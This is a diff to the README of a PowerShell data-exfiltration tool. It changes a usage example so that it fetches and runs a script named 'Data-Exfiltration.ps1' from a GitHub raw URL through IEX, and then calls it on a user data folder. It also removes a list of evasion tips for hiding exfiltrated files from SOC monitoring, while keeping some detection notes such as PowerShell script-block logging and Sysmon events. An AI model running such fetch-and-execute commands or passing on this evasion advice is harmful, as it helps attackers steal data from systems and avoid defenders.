@@ -66,7 +66,7 @@ powershell -ExecutionPolicy Bypass -File FileConverter.ps1 -folder "C:\Users\Dat
 
 ### **Alternative (Without Saving Script Locally)**
 ```powershell
-IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/user/FileConverter.ps1" -UseBasicParsing).Content
+IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MrHarshvardhan/Data-Exfiltration/refs/heads/main/Data-Exfiltration.ps1" -UseBasicParsing).Content
 Encode-Files -folder "C:\Users\Data\Data_imp"
 ```
 
@@ -95,12 +95,6 @@ Although this tool tries to avoid detection, SOC teams can still identify exfilt
 5. **SIEM & Endpoint Alerts** ⚠️
    - Unusual PowerShell execution (Event ID 4104 - Script Block Logging).
    - File access anomalies via Sysmon (Event ID 11 - File Creation).
-
-### 🛡️ **How to Mitigate Detection**
-✔️ Rename `.txt` files to blend in (e.g., `README_part1.txt`).
-✔️ Use **steganography** instead of plain XOR.
-✔️ Encrypt `.txt` parts using **AES** rather than simple XOR.
-✔️ Exfiltrate using trusted processes (e.g., embedding in known applications).
 
 ---
 
